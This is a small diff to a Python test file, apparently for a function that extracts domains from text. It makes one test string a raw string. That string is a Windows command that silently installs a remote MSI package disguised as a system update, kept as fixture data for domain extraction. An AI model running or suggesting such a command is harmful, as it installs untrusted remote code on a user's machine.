@@ -27,7 +27,7 @@ def test_is_valid_url(url, expected):
             ["www.example1.com", "www.example2.com"],
         ),
         (
-            '"C:\Windows\System32\msiexec.exe" /qn /i http://newdomain.asdasd.com/KB4054519.msi',
+            r'"C:\Windows\System32\msiexec.exe" /qn /i http://newdomain.asdasd.com/KB4054519.msi',
             ["newdomain.asdasd.com"],
         ),
     ],
